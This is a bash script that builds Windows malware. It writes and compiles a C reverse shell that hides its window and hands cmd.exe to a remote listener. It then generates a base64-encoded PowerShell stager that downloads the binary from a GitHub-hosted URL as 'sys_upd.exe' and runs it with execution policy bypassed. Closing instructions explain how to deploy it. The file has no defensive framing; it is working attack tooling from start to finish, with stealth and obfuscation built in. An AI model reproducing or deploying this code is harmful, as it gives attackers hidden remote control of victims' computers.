#!/bin/bash

# --- CONFIGURATION ---
# The URL where you will host the compiled payload.binary
GITHUB_URL="https://githubusercontent.com"

echo -e "\e[1;32m[*]\e[0m Building Native C Victim with Handshake Logic..."

# 1. Create Native C Source
# This binary accepts IP and Port from the command line
cat <<EOF > native_victim.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[]) {
    if (argc < 3) return 1;
    char *ip = argv[1];
    int port = atoi(argv[2]);

    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    // --- PHASE 1: HANDSHAKE ---
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        send(s, "WINDOWS_SHELL\n", 14, 0);
        closesocket(s);
    }
    
    Sleep(2000); // Wait for listener to cycle back to nc

    // --- PHASE 2: PERSISTENT SHELL ---
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
        si.wShowWindow = SW_HIDE;

        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    return 0;
}
EOF

# 2. Compile for Windows (GUI mode for stealth)
x86_64-w64-mingw32-gcc native_victim.c -o payload.binary -lws2_32 -mwindows

if [ ! -f payload.binary ]; then
    echo -e "\e[1;31m[-] Error: Compilation failed.\e[0m"
    exit 1
fi

echo -e "\e[1;32m[+]\e[0m Native payload generated: \e[1;33mpayload.binary\e[0m"

# 3. Create the Obfuscated PowerShell Stager
# We use "& { ... } $args[0] $args[1]" to pipe the command-line arguments 
# into the encoded block's param() section.
STAGER_LOGIC="& { param(\$i, \$p); \$f='\$env:TEMP\sys_upd.exe'; (New-Object Net.WebClient).DownloadFile('$GITHUB_URL', \$f); Start-Process \$f -ArgumentList \"\$i \$p\" } \$args[0] \$args[1]"

# 4. Final Encoding (UTF-16LE is required for -EncodedCommand)
FINAL_B64=$(echo -n "$STAGER_LOGIC" | iconv -t utf16le | base64 -w 0)

# 5. Output the command to the final file
# Usage: windows_client.ps1 <IP> <PORT>
echo "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $FINAL_B64" > windows_client.ps1

echo -e "\e[1;32m[+]\e[0m Deployment script created: \e[1;33mwindows_client.ps1\e[0m"
echo -e "\e[1;34m[*] INSTRUCTIONS:\e[0m"
echo -e "    1. Upload 'payload.binary' to your GitHub."
echo -e "    2. Run: ./windows_client.ps1 10.0.13.7 4444"

# Cleanup source
rm native_victim.c
